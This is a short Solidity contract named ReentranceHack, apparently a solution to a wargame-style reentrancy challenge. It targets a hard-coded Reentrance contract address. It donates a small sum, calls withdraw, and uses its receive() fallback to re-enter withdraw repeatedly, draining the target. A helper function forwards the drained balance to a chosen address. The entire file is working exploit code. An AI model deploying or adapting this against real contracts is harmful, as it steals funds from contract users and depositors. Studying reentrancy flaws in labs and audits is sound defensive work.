// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "lib/openzeppelin-contracts/contracts/math/SafeMath.sol";
import "./Reentrance.sol";

contract ReentranceHack {
    Reentrance public reentance;

    constructor() public payable {
        reentance = Reentrance(0x76FAB4Dad6273910836AE4577FC64727174E298f);
    }

    function donate() public {
        reentance.donate{value: 0.001 ether}(address(this));
    }

    function hack() public {
        reentance.withdraw(0.001 ether);
    }

    function getBalance(address _who) external view returns (uint) {
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable {
        require(_to.send(address(this).balance), "could not send Ether");
    }

    receive() external payable {
        reentance.withdraw(0.001 ether);
    }
}
